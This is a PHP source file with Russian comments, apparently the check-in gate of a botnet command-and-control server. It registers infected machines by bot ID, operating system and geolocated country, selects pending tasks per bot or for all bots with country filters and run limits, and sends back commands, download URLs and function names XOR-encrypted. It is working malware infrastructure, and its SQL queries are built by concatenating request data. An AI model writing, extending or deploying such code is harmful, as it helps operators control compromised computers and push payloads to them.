<?php

require("config.php");
require("includes/functions.php");
require("includes/mysql.php");
require("includes/geoip.php");
$db = new odbcClass();

// если есть ось и идентификатор бота
if(isset($_GET["bid"]) && isset($_GET["os"]))
{
	$bid = $_GET["bid"];
	$os = get_os($_GET['os']);

	// правильный ли формат идентификатора бота
	if(preg_match("/^[[:xdigit:]]{16}$/", $bid))
	{
		// смотрим страну по IP. А IP проверяем на валидность.
		$ip = getip();
		$cc = get_country($ip);
		
		// вставляем в базу идентификатор бота, если такой уже есть то изменяем время последнего захода
		$db -> query("INSERT INTO `bots` (`id`,`ip`,`cc`,`first_time`,`last_time`,`system`) VALUES ('".$bid."','".$ip."','".$cc."','".time()."','".time()."','".$os."') ON DUPLICATE KEY UPDATE `last_time` = '".time()."';");

		// работа с задачами
		// выбираем задачу + данные из таблицы стран относящиеся к задаче + табличку с лимитами ГДЕ id бота в таблице заданий есть как у пришедшего и в списке стран есть страна которая соответствует нашей, и бот не в списке финишировавших для этой задачи
		$task = $db -> query("SELECT * FROM tasks
LEFT JOIN ccTaskFilter ON ccTaskFilter.taskId = tasks.id 
WHERE tasks.bot = '".$bid."' 
AND (tasks.count < tasks.`limit` OR tasks.`limit` = 0)
AND (ccTaskFilter.cc = '".$cc."' OR ccTaskFilter.cc='all') 
AND '".$bid."' NOT IN (SELECT botId FROM finished WHERE finished.taskId = tasks.id)
AND (tasks.stop = '0' OR tasks.stop = '-1')");
		
		if ($task[0] == 0) {
			// выбираем задачу + данные из таблицы стран относящиеся к задаче + табличку с лимитами ГДЕ id бота в таблице заданий для всех и в списке стран есть страна которая соответствует нашей, и бот не в списке финишировавших для этой задачи
			$task=$db->query("SELECT * FROM tasks
LEFT JOIN ccTaskFilter ON ccTaskFilter.taskId = tasks.id 
WHERE tasks.bot = 'all' 
AND (tasks.count < tasks.`limit` OR tasks.`limit` = 0)
AND (ccTaskFilter.cc = '".$cc."' OR ccTaskFilter.cc='all') 
AND '".$bid."' NOT IN (SELECT botId FROM finished WHERE finished.taskId = tasks.id)
AND (tasks.stop = '0' OR tasks.stop = '-1')");
			}

		
		$task[0]==0 ? exit(SECRET_KEY) : false;
		
		
		// формируем вывод задания
		$taskOut='';
		foreach($task as $k=>$v) {
			$v['flags']=trim($v['flags']);
			if (!empty($v['flags'])) {
				$v['flags']=str_split($v['flags']);
				$v['flags']=' -'.implode(' -',$v['flags']);
			}
			// правка от 2 сентября 2011г.
			if ($v['command']=='update') $v['flags']='';
			$taskOut.=$v['command'].$v['flags'].' '.$v['url'].' '.$v['functionName']."\r\n";
			// ставим задачу в завершенные для этого бота
			$db->query("INSERT INTO `finished` (`botId`, `taskId`) VALUES ('".$bid."', '".$v['id']."');");
			// умножаем лимитер на одну тиерацию если задание конечно по лимиту итераций
			$db->query("UPDATE `tasks` SET  `count` =  '".intval($v['count']+1)."' WHERE `id` ='".$v['id']."'");
		}
		
		//echo trim($taskOut,"\r\n");
		$xorkey = generate_key(10);
		exit($xorkey . encrypt($taskOut, $xorkey));
	}
}